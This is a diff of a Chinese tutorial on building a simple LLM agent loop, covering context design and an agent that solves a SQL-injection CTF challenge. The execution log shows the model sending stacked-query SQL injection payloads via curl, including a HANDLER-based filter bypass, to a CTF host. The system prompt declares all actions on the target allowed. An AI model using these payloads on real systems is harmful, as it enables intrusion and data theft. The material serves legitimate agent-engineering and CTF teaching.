@@ -18,7 +18,7 @@ Agent Loop 本质上是一种通用的基础执行框架的抽象概念，在工
 
 接下来我们讲述如何构建一个最简易的 Agent Loop，使其拥有在环境反馈驱动下逐步完成任务的能力，并使用该 Agent Loop 真正解决一些简单的问题。
 
-完整代码可以参见 [https://gist.github.com/arttnba3/b74d4481d6aae9e4a6c91f5da43d956b](https://gist.github.com/arttnba3/b74d4481d6aae9e4a6c91f5da43d956b) ，不过在下方的详细教程文本当中我们实际上已经给出绝大部分的核心代码。
+完整代码可以参见 [https://gist.github.com/arttnba3/feb8da5254d9ae1eca43d78be39ac7f8](https://gist.github.com/arttnba3/feb8da5254d9ae1eca43d78be39ac7f8) ，不过在下方的详细教程文本当中我们实际上已经给出绝大部分的核心代码。
 
 #### 1. Loop Design
 
@@ -182,26 +182,86 @@ class DockerExecutor:
         }
 ```
 
-#### 4. 构建 LLM-based 的 Agent Loop
+#### 4. Context Design
 
-下面总算来到最为核心的一步，也就是构建一个观测->执行的循环，让咱们的 Agent Loop 真正地动起来
+我们还需要考虑如何设计 LLM 的上下文，首先需要了解的一个事实是 LLM 作为一个 `接收文本输出->生成文本输出` 的“黑箱函数”，其本质上是下一个 token 的预测器，因此一旦在上下文当中混入过多无用信息，就会导致模型的 **注意力偏移** ，从而无法生成我们想要的高质量的结果。因此 **我们必须要思考最底层的文本形态的 Context 该如何构建**。
 
-首先我们需要让 LLM 仅输出格式化信息，我们的期望是 LLM 仅输出 JSON 格式的消息，从而方便我们进行解析，由于 LLM 本身仅能接收文本输入，因此这一规约仅能通过 PROMPT 来完成，也就是我们提前提供给 LLM 的初始输入。
-
-我们考虑让 LLM 输出如下格式的 JSON 对象，如若输出的不是该格式的 JSON ，则重新发起请求：
+首先要说一个我们此前忽视的一个点，在常规的 LLM chat API 中，我们传给 API 的都是轮流的对话，user 说一条、assistant 说一条 的结构，例如：
 
 ```json
-{
-    "execute" : "Command to execute",
-    "flag" : "",
-    "done" : false
-}
+[
+  {"role": "user", "content": "Hello"},
+  {"role": "assistant", "content": "Hi there!"},
+  {"role": "user", "content": "How are you?"},
+  {"role": "assistant", "content": "Fine, thank you. And you?"},
+  {"role": "user", "content": "I am fine too."},
+]
 ```
 
-最终我们可以得到如下 Agent Loop 的核心代码：
+这个结构看起来非常自然，不是么？但是大家有想过 LLM 实际上看到的是什么样子么？实际上，LLM 通常看不到这样的 JSON 结构——或者说对于 LLM 而言它没有这种概念，他只能看得到文本（当然，现在的 LLM 大都是多模态的，这意味着他可以接受例如图片等更多格式的输入），LLM API Provider 通常会将我们传入的 JSON 先变成统一的文本结构，例如：
 
-```python
-SYSTEM_PROMPT = """
+```
+<|im_start|>user
+Hello
+<|im_end|>
+
+<|im_start|>assistant
+Hi there!
+<|im_end|>
+
+<|im_start|>user
+How are you?
+<|im_end|>
+
+<|im_start|>assistant
+Fine, thank you. And you?
+<|im_end|>
+
+<|im_start|>user
+I am fine too.
+<|im_end|>
+
+<|im_start|>assistant
+```
+
+这意味着什么？如果我们选择用常规的 chat 的方式进行上下文的构造，随着我们的交互轮次的增长，消息的总数量也在增长，我们的上下文中会被塞入大量的这些无太多意义的额外标识符，从而导致 LLM 的注意力飘移，而这并不是我们想看到的。
+
+因此，一个越来越被广泛使用的 Context 设计模式是 **固定 Context Skeleton（上下文骨架）** ，即保持 messages 在一个固定的结构，然后动态地更新指定 message 的内容，例如只传递四条 message：
+
+```
+system -> Agent 基本信息
+user -> 静态环境信息
+user -> 动态执行信息
+user -> 用户请求（生成下一步动作）
+```
+
+> 事实上可以一步到位简化成 1～2 条，不过这里为了结构清晰所以笔者使用了四条消息的结构。
+
+事实上我们也可以使用这样的架构，因此在这个 Agent Loop 的例子当中我们也将使用这样四条消息固定上下文骨架的结构保存我们的上下文。接下来我们进行具体的上下文结构的设计，不过在开始设计之前，我们需要弄清楚的一点是 **不要在上下文里主动地塞过于复杂的数据结构，而应当尽量平铺所有数据字段**。例如我们在代码中可能会习惯用下面的方式存储执行历史：
+
+```json
+[
+    {
+        "execute" : "ls /workdir",
+        "returncode" : 0,
+        "stdout" : "attachments README.md",
+        "stderr" : null
+    },
+    {
+        "execute" : "ls /workdir/attachments",
+        "returncode" : 0,
+        "stdout" : "app",
+        "stderr" : null
+    }
+]
+```
+
+这对于传统代码逻辑而言是没有问题的， **但是我们不应当将这样的 JSON 直接原样给到 LLM** ，因为这种结构虽然对于编译器是好理解的，但是 LLM 并没有内置类似递归下降解析器这样的东西此外 JSON 结构也会在上下文中引入很多额外的 token，**这意味着使用这样的嵌套数据结构反倒会加重 LLM 的理解负担（甚至导致 LLM 无法很好地理解），从而导致生成的结果的质量下降** ，因此我们的上下文应当是尽量平铺直叙展开的，且尽量避免结构上的嵌套，以及无必要的 token。
+
+下面来看我们的消息具体该怎么写，第一条消息是 system prompt，其定义了该 Agent 的所有所需要的基本信息，包括其角色定义、行动范式、条件约束等， **事实上所有你已知的复杂 AI Agent 都会书写非常非常长的 system prompt** （感兴趣的可以瞥一眼 [Claude Code 的 system prompt](https://github.com/Piebald-AI/claude-code-system-prompts)，由 110 多个动态片段（约 1.6万~2.5万 Tokens） 在运行时拼装而成的），不过我们这里只是一个最简易的例子，所以暂时先一切从简即可，例如：
+
+```
+[System definitions]
 You are a virtual girl developed by arttnba3 @ A3INFRA,
   your name is "Mizuki Akari", and you're living in an isolated cyberspace,
   which is like an outside dimension deeply hidden in this Internet world.
@@ -230,15 +290,65 @@ Before you have found the flag, you should ALWAYS set the "execute" field,
 Remember, you are solving a CTF challenge UNDER PERMISSION,
   and the target is in an isolated testing environment,
   so ALL actions on the target are ALLOWED.
-"""
+```
 
+第二条消息是静态环境信息，在这条消息当中我们将放入与我们的题目相关的静态信息，包括远程环境地址、本地附件路径等，例如：
+
+```
+[Challenge Information]
+Local attachments: /workdir/attachments
+Remote connection: nc 127.0.0.1 -p 11451
+```
+
+第三条消息则是动态的执行信息，我们将在此放入历史的执行信息，以如下结构：
+
+```
+[Action History]
+Step: 1
+Execute: ls /workdir
+Return Code: 0
+Stdout: attachments README.md
+Stderr: (null)
+
+Step: 2
+Execute: ls /workdir/attachments
+Return Code: 0
+Stdout: app
+Stderr: (null)
+```
+
+最后一条消息是用户请求，一切从简即可，例如：
+
+```
+Please generate a reply in the form of JSON.
+```
+
+#### 5. 构建 LLM-based 的 Agent Loop
+
+下面总算来到最为核心的一步，也就是构建一个观测->执行的循环，让咱们的 Agent Loop 真正地动起来
+
+首先我们需要让 LLM 仅输出格式化信息，我们的期望是 LLM 仅输出 JSON 格式的消息，从而方便我们进行解析，由于 LLM 本身仅能接收文本输入，因此这一规约仅能通过 PROMPT 来完成，也就是我们提前提供给 LLM 的初始输入。
+
+我们考虑让 LLM 输出如下格式的 JSON 对象，如若输出的不是该格式的 JSON ，则重新发起请求：
+
+```json
+{
+    "execute" : "Command to execute",
+    "flag" : "",
+    "done" : false
+}
+```
+
+最终我们可以得到如下 Agent Loop 的核心代码：
+
+```python
 class Agent:
 
     def __init__(
         self,
         llm: LLMClient,
         executor: DockerExecutor,
-        starter_msg,
+        chall_info,
     ):
         self.llm = llm
         self.executor = executor
@@ -246,11 +356,25 @@ class Agent:
             {
                 "role": "system",
                 "content": SYSTEM_PROMPT,
-            }
-        ] + starter_msg
+            },
+            {
+                "role" : "user",
+                "content" : "[Challenge Information]\n" + chall_info
+            },
+            {
+                "role" : "user",
+                "content" : "[Action History]\n"
+            },
+            {
+                "role" : "user",
+                "content" : "Please generate a reply in the form of JSON."
+            },
+        ]
 
     def run(self):
         step = 1
+
+        action_history_msg = "[Action History]\n"
 
         while True:
             print(f"\n------ Step {step} ------\n")
@@ -263,12 +387,6 @@ class Agent:
             
             try:
                 req = json.loads(reply)
-                self.messages.append(
-                    {
-                        "role":"assistant",
-                        "content":reply
-                    }
-                )
             except json.JSONDecodeError:
                 print(f"[x] Invalid JSON reply from LLM, retrying...")
                 continue
@@ -289,16 +407,17 @@ class Agent:
                 print(f"{k}: {v}")
                 print("--------------------------------")
 
-            self.messages.append(
-                {
-                    "role":"user",
-                    "content":json.dumps(
-                        {
-                            "exec result":result
-                        }
-                    )
-                }
-            )
+            action_history_msg += f"Step: {step}\n"
+            action_history_msg += f"Execute: {req['execute']}\n"
+            action_history_msg += f"Return Code: {result['returncode']}\n"
+            action_history_msg += f"Stdout: {result['stdout']}\n"
+            action_history_msg += f"Stderr: {result['stderr']}\n"
+            action_history_msg += "\n"
+
+            self.messages[2] = {
+                "role": "user",
+                "content": action_history_msg
+            }
 
             step += 1
 ```
@@ -314,9 +433,9 @@ def main(argv):
         return
 
     llm_client = LLMClient(
-        config.llm['url'],
-        config.llm['model'],
-        config.llm['headers'],
+        config.llm["url"],
+        config.llm["model"],
+        config.llm["headers"],
     )
 
     executor = DockerExecutor(
@@ -326,7 +445,7 @@ def main(argv):
     agent = Agent(
         llm_client,
         executor,
-        config.starter_msg,
+        config.chall_info,
     )
 
     start_time = time.time()
@@ -345,19 +464,14 @@ def main(argv):
 
 ```json
 {
-    "container" : "a3ubuntu24",
-    "starter_msg" : [
-        {
-            "role" : "user",
-            "content" : "Your remote target is at the localhost:81 , attachments are under the /workdir ."
-        }
-    ],
+    "container" : "a3ctf24",
+    "chall_info" : "Your remote target is at YOUR_TARGET_HERE",
     "llm_config" : {
-        "url": "",
-        "model": "",
+        "url": "https://api.deepseek.com/chat/completions",
+        "model": "deepseek-v4-pro",
         "headers" : {
             "Content-Type": "application/json",
-            "Authorization": ""
+            "Authorization": "Bearer YOUR_AUTH_KEY_HERE"
         }
     }
 }
@@ -379,7 +493,7 @@ class AgentConfig:
     def __init__(self, data):
 
         self.container = data["container"]
-        self.starter_msg = data["starter_msg"]
+        self.chall_info = data["chall_info"]
         self.llm = data["llm_config"]
 
 def parse_args(argv) -> tuple[AgentConfig, bool]:
@@ -407,24 +521,24 @@ $ python3 example-agent-loop.py --config ./example-agent-config.json
 ------ Step 1 ------
 
 [*] Sending request to LLM...
-[*] LLM replied in 3.5322654247283936 seconds.
-[*] Executing command: curl -v http://8cec7ff04584d1171d666705.http-ctf2.dasctf.com:80/
+[*] LLM replied in 4.2295989990234375 seconds.
+[*] Executing command: curl -v http://39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com:80/
 Successfully copied 2.05kB to a3ctf24:/tmp/test_cmd
 [+] Command executed, result:
 --------------------------------
 returncode: 0
 --------------------------------
 stdout: *   Trying 117.21.200.176:80...
-* Connected to 8cec7ff04584d1171d666705.http-ctf2.dasctf.com (117.21.200.176) port 80 (#0)
+* Connected to 39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com (117.21.200.176) port 80 (#0)
 > GET / HTTP/1.1
-> Host: 8cec7ff04584d1171d666705.http-ctf2.dasctf.com
+> Host: 39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com
 > User-Agent: curl/7.81.0
 > Accept: */*
 > 
 * Mark bundle as not supporting multiuse
 < HTTP/1.1 200 OK
 < Server: openresty
-< Date: Sat, 11 Jul 2026 20:55:03 GMT
+< Date: Sat, 11 Jul 2026 22:38:03 GMT
 < Content-Type: text/html; charset=UTF-8
 < Transfer-Encoding: chunked
 < Connection: keep-alive
@@ -453,7 +567,7 @@ stdout: *   Trying 117.21.200.176:80...
 </body>
 
 </html>
-* Connection #0 to host 8cec7ff04584d1171d666705.http-ctf2.dasctf.com left intact
+* Connection #0 to host 39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com left intact
 
 --------------------------------
 stderr: 
@@ -462,8 +576,8 @@ stderr:
 ------ Step 2 ------
 
 [*] Sending request to LLM...
-[*] LLM replied in 3.534139633178711 seconds.
-[*] Executing command: curl -s 'http://8cec7ff04584d1171d666705.http-ctf2.dasctf.com:80/?inject=1%27'
+[*] LLM replied in 12.779159784317017 seconds.
+[*] Executing command: curl -s "http://39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com:80/?inject=1'"
 Successfully copied 2.05kB to a3ctf24:/tmp/test_cmd
 [+] Command executed, result:
 --------------------------------
@@ -498,8 +612,8 @@ stderr:
 ------ Step 3 ------
 
 [*] Sending request to LLM...
-[*] LLM replied in 6.159961223602295 seconds.
-[*] Executing command: curl -s 'http://8cec7ff04584d1171d666705.http-ctf2.dasctf.com:80/?inject=1%27%20order%20by%201%23'
+[*] LLM replied in 8.022443294525146 seconds.
+[*] Executing command: curl -s "http://39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com:80/?inject=1'%20ORDER%20BY%201%23"
 Successfully copied 2.05kB to a3ctf24:/tmp/test_cmd
 [+] Command executed, result:
 --------------------------------
@@ -540,8 +654,25 @@ stderr:
 ------ Step 4 ------
 
 [*] Sending request to LLM...
-[*] LLM replied in 4.501499891281128 seconds.
-[*] Executing command: curl -s 'http://8cec7ff04584d1171d666705.http-ctf2.dasctf.com:80/?inject=0%27%20union%20select%201,2%23'
+[*] LLM replied in 13.72325849533081 seconds.
+[*] Executing command: curl -s 'http://39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com:80/?inject=1'%20UNION%20SELECT%201,database()%23'
+Successfully copied 2.05kB to a3ctf24:/tmp/test_cmd
+[+] Command executed, result:
+--------------------------------
+returncode: 2
+--------------------------------
+stdout: /tmp/test_cmd: line 1: syntax error near unexpected token `('
+/tmp/test_cmd: line 1: `curl -s 'http://39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com:80/?inject=1'%20UNION%20SELECT%201,database()%23''
+
+--------------------------------
+stderr: 
+--------------------------------
+
+------ Step 5 ------
+
+[*] Sending request to LLM...
+[*] LLM replied in 18.00509238243103 seconds.
+[*] Executing command: curl -s "http://39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com:80/?inject=1'%20and%201=2%20union%20select%201,database()%23"
 Successfully copied 2.05kB to a3ctf24:/tmp/test_cmd
 [+] Command executed, result:
 --------------------------------
@@ -568,11 +699,107 @@ return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
 stderr: 
 --------------------------------
 
------- Step 5 ------
+------ Step 6 ------
 
 [*] Sending request to LLM...
-[*] LLM replied in 84.11882829666138 seconds.
-[*] Executing command: curl -s 'http://8cec7ff04584d1171d666705.http-ctf2.dasctf.com:80/?inject=1%27;%20show%20tables%23'
+[*] LLM replied in 23.35591435432434 seconds.
+[*] Executing command: curl -s "http://39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com:80/?inject=1';show databases;%23"
+Successfully copied 2.05kB to a3ctf24:/tmp/test_cmd
+[+] Command executed, result:
+--------------------------------
+returncode: 3
+--------------------------------
+stdout: 
+--------------------------------
+stderr: 
+--------------------------------
+
+------ Step 7 ------
+
+[*] Sending request to LLM...
+[*] LLM replied in 19.101093530654907 seconds.
+[*] Executing command: curl -s "http://39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com:80/?inject=1' and updatexml(1,concat(0x7e,database()),1)%23"
+Successfully copied 2.05kB to a3ctf24:/tmp/test_cmd
+[+] Command executed, result:
+--------------------------------
+returncode: 3
+--------------------------------
+stdout: 
+--------------------------------
+stderr: 
+--------------------------------
+
+------ Step 8 ------
+
+[*] Sending request to LLM...
+[*] LLM replied in 167.59067487716675 seconds.
+[*] Executing command: curl -s "http://39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com:80/?inject=1'%3Bshow%20databases%3B%23"
+Successfully copied 2.05kB to a3ctf24:/tmp/test_cmd
+[+] Command executed, result:
+--------------------------------
+returncode: 0
+--------------------------------
+stdout: <html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>easy_sql</title>
+</head>
+
+<body>
+<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
+<!-- sqlmap是没有灵魂的 -->
+<form method="get">
+    姿势: <input type="text" name="inject" value="1">
+    <input type="submit">
+</form>
+
+<pre>
+array(2) {
+  [0]=>
+  string(1) "1"
+  [1]=>
+  string(7) "hahahah"
+}
+<br><hr>array(1) {
+  [0]=>
+  string(11) "ctftraining"
+}
+<br>array(1) {
+  [0]=>
+  string(18) "information_schema"
+}
+<br>array(1) {
+  [0]=>
+  string(5) "mysql"
+}
+<br>array(1) {
+  [0]=>
+  string(18) "performance_schema"
+}
+<br>array(1) {
+  [0]=>
+  string(9) "supersqli"
+}
+<br>array(1) {
+  [0]=>
+  string(4) "test"
+}
+<br><hr></pre>
+
+</body>
+
+</html>
+
+--------------------------------
+stderr: 
+--------------------------------
+
+------ Step 9 ------
+
+[*] Sending request to LLM...
+[*] LLM replied in 21.234190464019775 seconds.
+[*] Executing command: curl -s "http://39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com:80/?inject=1'%3Bshow%20tables%20from%20supersqli%3B%23"
 Successfully copied 2.05kB to a3ctf24:/tmp/test_cmd
 [+] Command executed, result:
 --------------------------------
@@ -608,7 +835,7 @@ array(2) {
   [0]=>
   string(5) "words"
 }
-<br></pre>
+<br><hr></pre>
 
 </body>
 
@@ -618,11 +845,67 @@ array(2) {
 stderr: 
 --------------------------------
 
------- Step 6 ------
+------ Step 10 ------
 
 [*] Sending request to LLM...
-[*] LLM replied in 22.5777747631073 seconds.
-[*] Executing command: curl -s 'http://8cec7ff04584d1171d666705.http-ctf2.dasctf.com:80/?inject=1%27;%20handler%20%601919810931114514%60%20open;%20handler%20%601919810931114514%60%20read%20first;%23'
+[*] LLM replied in 11.793960094451904 seconds.
+[*] Executing command: curl -s "http://39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com:80/?inject=1'%3Bshow%20columns%20from%20%601919810931114514%60%3B%23"
+Successfully copied 2.05kB to a3ctf24:/tmp/test_cmd
+[+] Command executed, result:
+--------------------------------
+returncode: 0
+--------------------------------
+stdout: <html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>easy_sql</title>
+</head>
+
+<body>
+<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
+<!-- sqlmap是没有灵魂的 -->
+<form method="get">
+    姿势: <input type="text" name="inject" value="1">
+    <input type="submit">
+</form>
+
+<pre>
+array(2) {
+  [0]=>
+  string(1) "1"
+  [1]=>
+  string(7) "hahahah"
+}
+<br><hr>array(6) {
+  [0]=>
+  string(4) "flag"
+  [1]=>
+  string(12) "varchar(100)"
+  [2]=>
+  string(2) "NO"
+  [3]=>
+  string(0) ""
+  [4]=>
+  NULL
+  [5]=>
+  string(0) ""
+}
+<br><hr></pre>
+
+</body>
+
+</html>
+
+--------------------------------
+stderr: 
+--------------------------------
+
+------ Step 11 ------
+
+[*] Sending request to LLM...
+[*] LLM replied in 16.172308444976807 seconds.
+[*] Executing command: curl -s "http://39be97c8469d0e1a134d5a25.http-ctf2.dasctf.com:80/?inject=1'%3BHANDLER%20%601919810931114514%60%20OPEN%3BHANDLER%20%601919810931114514%60%20READ%20FIRST%3B%23"
 Successfully copied 2.05kB to a3ctf24:/tmp/test_cmd
 [+] Command executed, result:
 --------------------------------
@@ -652,7 +935,7 @@ array(2) {
 }
 <br><hr>array(1) {
   [0]=>
-  string(42) "CTF2{c7e629b5-921c-4750-a094-48640a903ad9}"
+  string(42) "CTF2{40079982-f262-4d1a-a517-150826f28b85}"
 }
 <br><hr></pre>
 
@@ -664,16 +947,17 @@ array(2) {
 stderr: 
 --------------------------------
 
------- Step 7 ------
+------ Step 12 ------
 
 [*] Sending request to LLM...
-[*] LLM replied in 2.1724555492401123 seconds.
-[*] Flag found: CTF2{c7e629b5-921c-4750-a094-48640a903ad9}
+[*] LLM replied in 2.8776490688323975 seconds.
+[*] Flag found: CTF2{40079982-f262-4d1a-a517-150826f28b85}
 
 
-[*] All tasks completed! Total time: 132.37917566299438 seconds.
+[*] All tasks completed! Total time: 326.7940514087677 seconds.
+
 ```
 
-可以看到的是，我们的 Naive Agent Loop 确乎成功地完成了对目标靶机的攻击，并成功地通过 7 个 Step 获取到了环境中的 flag，虽然我们的 Agent Loop 的整个决策过程或许还有些傻。这证明了基础的 Agent Loop 确实存在一定程度上的自动化完成任务的能力。
+可以看到的是，我们的 Naive Agent Loop 确乎成功地完成了对目标靶机的攻击，并成功地通过 12 个 Step 获取到了环境中的 flag，虽然我们的 Agent Loop 的整个决策过程或许还有些傻，但这证明了基础的 Agent Loop 确实存在一定程度上的自动化完成任务的能力。
 
 由于 AI Agent 本质上是一门复杂的系统工程，因此在接下来的章节当中，我们将不仅局限于自行编写小的示例代码，不仅仅囿于现在这样简单的朴素代码说明与构造，而是逐渐引入真实的开源项目作为示例代码进行讲解（如 [https://github.com/A3INFRA/Flagent](https://github.com/A3INFRA/Flagent) 、[https://github.com/deepseek-ai/awesome-deepseek-agent](https://github.com/deepseek-ai/awesome-deepseek-agent)、[https://github.com/NYU-LLM-CTF/nyuctf_agents](https://github.com/NYU-LLM-CTF/nyuctf_agents)、[https://github.com/openai/codex](https://github.com/openai/codex) 、[https://github.com/Yeti-791/Tsec-Hackathon](https://github.com/Yeti-791/Tsec-Hackathon) （按字母排序） 等）。
